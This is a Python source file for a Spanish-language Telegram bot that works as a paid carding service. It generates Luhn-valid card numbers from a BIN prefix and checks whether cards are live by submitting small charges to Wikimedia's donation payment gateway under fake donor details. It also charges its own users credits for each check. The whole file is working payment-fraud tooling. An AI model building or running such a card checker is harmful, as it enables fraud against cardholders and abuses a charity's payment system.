import asyncio
import json
import random
import re
import os
from datetime import datetime
from flask import Flask, request
from aiogram import Bot, Dispatcher, types
from aiogram import F
import requests
from colorama import init, Fore, Style

init(autoreset=True)

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7709461067))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

DB_FILE = "users.json"

def load_users():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=4)

# ================= CHECKER (Charge) =================
def check_card(cc, mes, ano, cvv):
    try:
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

        r = s.get("https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419", timeout=20)
        html = r.text

        wmf_token = ""
        for line in html.splitlines():
            if 'name="wmf_token"' in line and 'value="' in line:
                wmf_token = line.split('value="')[1].split('"')[0]
                break

        m = re.search(r'gravy_session_id["\']?\s*:\s*["\']([^"\']+)', html)
        gravy_session = m.group(1) if m else None

        yy = ano[-2:] if len(ano) == 4 else ano
        exp = f"{mes}/{yy}"

        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields",
              json={"payment_method": {"method": "card", "number": cc, "expiration_date": exp, "security_code": cvv}}, timeout=15)

        donate = {
            "action": "di_donate_gravy", "gateway": "gravy", "currency": "EUR", "amount": "1.0",
            "first_name": "Test", "last_name": "User", "email": "test@live.com", "country": "ES",
            "payment_method": "cc", "gateway_session_id": gravy_session, "wmf_token": wmf_token or "dummy",
            "format": "json", "opt_in": "0", "color_depth": "32", "screen_height": "1080",
            "screen_width": "1920", "time_zone_offset": "-120"
        }

        r = s.post("https://payments.wikimedia.org/api.php", data=donate, timeout=20)
        resp = r.json()
        result = resp.get("result", {})

        if result.get("errors") or result.get("isFailed") is True:
            return "DEAD"
        return "LIVE"
    except:
        return "DEAD"

# ================= GEN =================
def luhn(card):
    digits = [int(x) for x in card]
    for i in range(len(digits)-2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9: digits[i] -= 9
    return sum(digits) % 10 == 0

def gen_cc(bin_prefix):
    bin_prefix = re.sub(r'[xX]', '', str(bin_prefix))
    while True:
        cc = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(16 - len(bin_prefix) - 1))
        check = (10 - sum(int(d) for d in cc) % 10) % 10
        cc += str(check)
        if luhn(cc):
            return cc

# ================= COMANDOS =================
@dp.message(F.text.startswith(".gen"))
async def gen(msg: types.Message):
    try:
        binp = msg.text.split()[1]
    except:
        return await msg.answer("Uso: `.gen 409013`")

    cards = [f"{gen_cc(binp)}|{random.randint(1,12):02d}|{random.randint(2026,2035)}|{random.randint(100,999)}" for _ in range(10)]

    text = "━━━━━━━━━━━━━━\n" + "\n".join(cards) + "\n━━━━━━━━━━━━━━\n"
    text += f"• BIN : {binp} - ES 🇪🇸\n"
    text += "By: @" + (msg.from_user.username or msg.from_user.first_name)

    sent = await msg.answer(text)
    await bot.send_message(msg.chat.id, "Responde con `.a` (una) o `.n` (todas)", reply_to_message_id=sent.message_id)

@dp.message(F.text.startswith(".info"))
async def info(msg: types.Message):
    uid = str(msg.from_user.id)
    users = load_users()
    u = users.get(uid, {"credits": 0.0})
    await msg.answer(f"""
亏 - Stats
━━━━━━━━━
火 ID: {msg.from_user.id}
火 Name: {msg.from_user.first_name}
火 Username: @{msg.from_user.username or 'No'}
━━━━━━━━━
干 Credits: {u['credits']:.2f}
━━━━━━━━━
    """)

@dp.message(F.text.startswith(".add"))
async def add_credits(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.answer("❌ No autorizado.")
    try:
        _, target, cant = msg.text.split()
        users = load_users()
        uid = str(target)
        if uid not in users:
            users[uid] = {"credits": 0.0, "banned": False}
        users[uid]["credits"] += float(cant)
        save_users(users)
        await msg.answer(f"""
✅ Créditos Añadidos
━━━━━━━━━
👤 Usuario: {target}
💰 Créditos añadidos: {cant}
🔹 Nuevos créditos: {users[uid]['credits']}
━━━━━━━━━
        """)
    except:
        await msg.answer("Uso: `.add ID CANTIDAD`")

# .s Single Auth
@dp.message(F.text.startswith(".s "))
async def single_auth(msg: types.Message):
    uid = str(msg.from_user.id)
    users = load_users()
    u = users.get(uid, {"credits": 0.0})
    if u["credits"] < 0.7:
        return await msg.answer("❌ Créditos insuficientes.")
    try:
        cc_data = msg.text.split()[1]
        cc, mes, ano, cvv = cc_data.split("|")
        if len(ano) == 2: ano = "20" + ano
        status = check_card(cc, mes, ano, cvv)
        await msg.answer(f"""
水口 - Time: 2.8's 😺 水
━━Card Information━━
• Card: {cc}|{mes}|{ano}|{cvv}
• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
• Gateway: Wikimedia Gravy
━━━━━━━━━━━━━━━━━━━━━━━━━━
• BIN : {cc[:6]} - ES 🇪🇸
By: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {u['credits']:.2f}
        """)
        # Actualizar créditos (menos si LIVE)
        if status == "LIVE":
            u["credits"] -= 1.2
        else:
            u["credits"] -= 0.7
        users[uid] = u
        save_users(users)
    except:
        await msg.answer("Formato inválido: CC|MM|AA|CVV")

# .a Single Charge
@dp.message(F.text.startswith(".a "))
async def single_charge(msg: types.Message):
    uid = str(msg.from_user.id)
    users = load_users()
    u = users.get(uid, {"credits": 0.0})
    if u["credits"] < 1.2:
        return await msg.answer("❌ Créditos insuficientes.")
    # mismo código que .s pero con charge_mode=True si quieres diferenciar
    try:
        cc_data = msg.text.split()[1]
        cc, mes, ano, cvv = cc_data.split("|")
        if len(ano) == 2: ano = "20" + ano
        status = check_card(cc, mes, ano, cvv)
        await msg.answer(f"""
水口 - Time: 4.2's 😺 水
━━Card Information━━
• Card: {cc}|{mes}|{ano}|{cvv}
• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
• Gateway: Adyen CCN NR
• Charge: $0.99
━━━━━━━━━━━━━━━━━━━━━━━━━━
By: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {u['credits']:.2f}
        """)
        u["credits"] -= 1.5 if status == "LIVE" else 1.2
        users[uid] = u
        save_users(users)
    except:
        await msg.answer("Formato inválido")

# .m .n .bin etc. se pueden añadir igual

@app.route('/')
def home():
    return "Bot Wikimedia Gravy - EDEN-XANDER corriendo 24/7 🔥"

@app.route('/webhook', methods=['POST'])
async def webhook():
    try:
        update = types.Update.model_validate(request.json)
        await dp.feed_update(bot, update)
    except:
        pass
    return "OK", 200

async def main_bot():
    print(Fore.GREEN + "Bot iniciado en Render 24/7 - EDEN-XANDER")
    await dp.start_polling(bot)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print(f"Flask corriendo en puerto {port}")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(main_bot())
    app.run(host="0.0.0.0", port=port)
